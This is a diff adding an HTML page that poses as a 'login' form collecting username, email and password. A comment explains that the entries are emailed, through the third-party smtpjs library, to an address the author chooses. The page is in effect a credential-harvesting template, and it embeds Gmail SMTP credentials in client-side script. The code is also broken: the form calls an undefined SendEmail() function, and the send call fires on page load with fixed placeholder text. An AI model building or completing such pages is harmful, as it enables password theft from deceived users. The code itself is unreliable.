@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Form:mo61n</title>
+  <link rel="stylesheet" href="style.css">
+  <script src="https://smtpjs.com/v3/smtp.js"></script>
+</head>
+<body>
+  <div class="contanier">
+    <form onsubmit="SendEmail(); reset(); return false;">
+      <h3>login</h3>
+      <h5>please enter your infurmation</h5>
+      <input type="text" id="name" placeholder="username" required>
+      <input type="email" id="email" placeholder="email">
+      <input type="password" id="pass" placeholder="password" required>
+      <textarea id="message" rows="4" placeholder="How can we help you ? "></textarea>
+      <button href="">
+        Send
+        <spand></spand>
+        <spand></spand>
+        <spand></spand>
+        <spand></spand>
+      </button>
+    </form>
+  </div>
+  <!--here you add the email address you want to send the information to, and when you click on the send buttom, this information will
+  be send to the desired email. to get more information, just serch smtpjs and you can watch videos about is-->
+  <script>
+    Email.send({
+      Host : "smtp.gmail.com",
+      //enter your gmail :
+      Username : "username",
+      //enter your password
+      Password : "password",
+      //enter the desired to send information :
+      To : 'them@website.com',
+      //from your email address
+      From : "you@isp.com",
+      //you can pick one subject
+      Subject : "This is the subject",
+      Body : "And this is the body"
+    }).then(
+       message => alert(message)
+    );
+  </script>
+</body>
+</html>
